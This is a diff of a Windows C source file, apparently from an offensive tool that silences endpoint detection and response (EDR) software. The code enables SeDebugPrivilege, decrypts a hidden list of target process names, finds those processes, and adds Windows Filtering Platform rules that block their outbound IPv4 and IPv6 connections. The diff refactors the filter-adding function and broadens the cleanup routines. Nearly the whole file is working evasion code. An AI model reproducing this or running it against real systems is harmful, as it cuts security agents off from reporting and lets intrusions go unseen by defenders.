@@ -1,45 +1,25 @@
-#include <initguid.h> // Must be included once per project
+#include <winsock2.h>
+#include <initguid.h>
+#include <fwpmu.h>
 #include "core.h"
 #include "errors.h"
 #include <strsafe.h>
 
-// --- HELPER FUNCTION PROTOTYPES ---
+// Helper prototypes
 static DWORD AddProviderAndSubLayer(HANDLE hEngine);
-static void ApplyBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
+static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
 static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);
 
-// --- PUBLIC FUNCTIONS ---
-
 void configureNetworkFilters() {
-    if (!EnableSeDebugPrivilege()) {
-        EPRINTF("[-] Failed to enable SeDebugPrivilege.\n");
-        return;
-    }
-
+    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
     HANDLE hEngine = NULL;
-    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
-        PrintDetailedError("FwpmEngineOpen0 failed", result);
-        return;
-    }
-
-    result = AddProviderAndSubLayer(hEngine);
-    if (result != ERROR_SUCCESS) {
-        FwpmEngineClose0(hEngine);
-        return;
-    }
-
-    // Process Enumeration Logic
+    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
+    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
+    
     char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
-    if (!decryptedNames) {
-        PrintDetailedError("Memory allocation failed for decrypted names list", GetLastError());
-        FwpmEngineClose0(hEngine);
-        return;
-    }
+    if (!decryptedNames) { FwpmEngineClose0(hEngine); return; }
 
-    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-        decryptedNames[i] = decryptString(processData[i]);
-    }
+    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { decryptedNames[i] = decryptString(processData[i]); }
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE) {
@@ -51,7 +31,7 @@ void configureNetworkFilters() {
                         PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
                         WCHAR fullPath[MAX_PATH];
                         if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
-                            ApplyBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
+                            ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
                         }
                     }
                 }
@@ -60,75 +40,106 @@ void configureNetworkFilters() {
         CloseHandle(hSnapshot);
     }
 
-    // Cleanup
-    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-        if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]);
-    }
+    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]); }
     HeapFree(g_hHeap, 0, decryptedNames);
     FwpmEngineClose0(hEngine);
 }
 
 void addProcessRule(const char* processPath) {
-    if (!EnableSeDebugPrivilege()) {
-        EPRINTF("[-] Failed to enable SeDebugPrivilege.\n");
-        return;
-    }
-
+    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
     HANDLE hEngine = NULL;
-    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
-        PrintDetailedError("FwpmEngineOpen0 failed", result);
-        return;
-    }
-
-    result = AddProviderAndSubLayer(hEngine);
-    if (result != ERROR_SUCCESS) {
-        FwpmEngineClose0(hEngine);
-        return;
-    }
+    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
+    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
 
     wchar_t processPathW[MAX_PATH];
     if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
-        PrintDetailedError("Failed to convert process path to wide string", GetLastError());
+        PrintDetailedError("Failed to convert process path", GetLastError());
     } else {
-        ApplyBlockFilterForPath(hEngine, &SubLayerGUID, processPathW);
+        ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, processPathW);
     }
-
     FwpmEngineClose0(hEngine);
 }
 
 void removeAllRules() {
     HANDLE hEngine = NULL;
     DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
-        PrintDetailedError("FwpmEngineOpen0 failed", result);
-        return;
-    }
+    if (result != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", result); return; }
 
     PRINTF("[+] Starting comprehensive cleanup...\n");
+
+    HANDLE enumHandle = NULL;
+    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
+    enumTemplate.providerKey = (GUID*)&ProviderGUID;
     
-    // Deleting the sublayer is the most atomic way to remove all its filters.
-    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
-    if (result == ERROR_SUCCESS || (long)result == FWP_E_SUBLAYER_NOT_FOUND) {
-        PRINTF("[+] WFP sublayer and its filters removed successfully.\n");
-    } else {
-        PrintDetailedError("FwpmSubLayerDeleteByKey0 failed. Filters may still be active", result);
+    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
+    if (result == ERROR_SUCCESS) {
+        FWPM_FILTER0** filters = NULL;
+        UINT32 numEntries = 0;
+        result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
+        if (result == ERROR_SUCCESS && numEntries > 0) {
+            PRINTF("[+] Removing %u filter(s)...\n", numEntries);
+            for (UINT32 i = 0; i < numEntries; i++) {
+                FwpmFilterDeleteById0(hEngine, filters[i]->filterId);
+            }
+            FwpmFreeMemory0((void**)&filters);
+        }
+        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
     }
 
+    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
+    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP sublayer removed successfully.\n"); }
+    else if ((long)result != FWP_E_SUBLAYER_NOT_FOUND) { PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result); }
+
     result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
-    if (result == ERROR_SUCCESS || (long)result == FWP_E_PROVIDER_NOT_FOUND) {
-        PRINTF("[+] WFP provider removed successfully.\n");
-    } else {
-        PrintDetailedError("FwpmProviderDeleteByKey0 failed", result);
-    }
+    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP provider removed successfully.\n"); }
+    else if ((long)result != FWP_E_PROVIDER_NOT_FOUND) { PrintDetailedError("FwpmProviderDeleteByKey0 failed", result); }
 
     FwpmEngineClose0(hEngine);
     PRINTF("[+] Cleanup complete.\n");
 }
 
+static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
+    FWP_BYTE_BLOB* appId = NULL;
+    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) { return; }
+    BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId, EDR_FILTER_NAME);
+    if (ipv4Exists) {
+        WPRINTF(L"    [!] Generic block filter for %s already exists. Skipping.\n", fullPath);
+        FreeAppId(appId);
+        return;
+    }
+    
+    DWORD result = FwpmTransactionBegin0(hEngine, 0);
+    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionBegin0 failed", result); FreeAppId(appId); return; }
+    
+    FWPM_FILTER0 blockFilter = {0};
+    blockFilter.providerKey = (GUID*)&ProviderGUID;
+    blockFilter.subLayerKey = *subLayerGuid;
+    blockFilter.action.type = FWP_ACTION_BLOCK;
+    blockFilter.displayData.name = EDR_FILTER_NAME;
+    blockFilter.weight.type = FWP_UINT8;
+    blockFilter.weight.uint8 = 0xF;
+    
+    FWPM_FILTER_CONDITION0 condition = {0};
+    blockFilter.filterCondition = &condition;
+    blockFilter.numFilterConditions = 1;
+    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
+    condition.matchType = FWP_MATCH_EQUAL;
+    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
+    condition.conditionValue.byteBlob = appId;
 
-// --- HELPER FUNCTIONS ---
+    UINT64 filterId = 0;
+    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
+    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
+    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId); }
+    
+    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
+    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
+    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId); }
 
+    result = FwpmTransactionCommit0(hEngine);
+    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
+    FreeAppId(appId);
+}
 static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
     DWORD result = FwpmTransactionBegin0(hEngine, 0);
     if (result != ERROR_SUCCESS) {
@@ -170,96 +181,6 @@ static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
     return result;
 }
 
-static void ApplyBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
-    FWP_BYTE_BLOB* appId = NULL;
-    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
-        EWPRINTF(L"    [-] Failed to get AppID for %s\n", fullPath);
-        return;
-    }
-
-    // Check if filters already exist before starting a transaction
-    BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId);
-    BOOL ipv6Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, appId);
-
-    if (ipv4Exists && ipv6Exists) {
-        WPRINTF(L"    [!] Filters for %s already exist. Skipping.\n", fullPath);
-        FreeAppId(appId);
-        return;
-    }
-
-    DWORD result = FwpmTransactionBegin0(hEngine, 0);
-    if (result != ERROR_SUCCESS) {
-        PrintDetailedError("ApplyBlockFilter FwpmTransactionBegin0 failed", result);
-        FreeAppId(appId);
-        return;
-    }
-
-    FWPM_FILTER0 blockFilter = { 0 };
-    blockFilter.providerKey = (GUID*)&ProviderGUID;
-    blockFilter.subLayerKey = *subLayerGuid;
-    blockFilter.action.type = FWP_ACTION_BLOCK;
-    blockFilter.flags = FWPM_FILTER_FLAG_PERSISTENT;
-    blockFilter.displayData.name = EDR_FILTER_NAME;
-    blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;
-    
-    blockFilter.weight.type = FWP_UINT64; 
-    UINT64 maxWeight = 0xFFFFFFFFFFFFFFFF; 
-    blockFilter.weight.uint64 = &maxWeight;
-
-    FWPM_FILTER_CONDITION0 blockCondition = { 0 };
-    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    blockCondition.matchType = FWP_MATCH_EQUAL;
-    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    blockCondition.conditionValue.byteBlob = appId;
-    blockFilter.filterCondition = &blockCondition;
-    blockFilter.numFilterConditions = 1;
-
-    if (!ipv4Exists) {
-        UINT64 filterId = 0;
-        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
-        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
-        if (result == ERROR_SUCCESS) {
-            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
-        }
-    }
-
-    if (!ipv6Exists) {
-        UINT64 filterId = 0;
-        blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
-        result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
-        if (result == ERROR_SUCCESS) {
-            WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
-        }
-    }
-
-    result = FwpmTransactionCommit0(hEngine);
-    if (result != ERROR_SUCCESS) {
-        PrintDetailedError("ApplyBlockFilter FwpmTransactionCommit0 failed", result);
-        FwpmTransactionAbort0(hEngine);
-    }
-    
-    FreeAppId(appId);
-}
-
-UINT64 CustomStrToULL(const char* str, char** endptr) {
-    UINT64 result = 0;
-    const char* p = str;
-
-    while (*p == ' ' || *p == '\t') {
-        p++;
-    }
-
-    while (*p >= '0' && *p <= '9') {
-        result = result * 10 + (*p - '0');
-        p++;
-    }
-
-    if (endptr) {
-        *endptr = (char*)p;
-    }
-    return result;
-}
-
 static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
     FWP_BYTE_BLOB* appId = NULL;
     DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
@@ -268,7 +189,7 @@ static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
         return;
     }
 
-    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6 };
+    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, &FWPM_LAYER_OUTBOUND_TRANSPORT_V4, &FWPM_LAYER_OUTBOUND_TRANSPORT_V6 };
     UINT totalRemoved = 0;
 
     FWPM_FILTER_CONDITION0 condition = { 0 };
@@ -277,13 +198,13 @@ static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
     condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
     condition.conditionValue.byteBlob = appId;
 
-    for (int i = 0; i < 2; ++i) {
+    for (int i = 0; i < 4; ++i) {
         HANDLE enumHandle = NULL;
         FWPM_FILTER0** ppFilters = NULL;
         UINT32 numEntries = 0;
 
         FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
-        enumTemplate.providerKey = (GUID*)&ProviderGUID; // Make the search specific to our provider
+        enumTemplate.providerKey = (GUID*)&ProviderGUID;
         enumTemplate.layerKey = *layers[i];
         enumTemplate.numFilterConditions = 1;
         enumTemplate.filterCondition = &condition;
@@ -360,3 +281,4 @@ void removeRuleById(UINT64 ruleId) {
 
     FwpmEngineClose0(hEngine);
 }
+
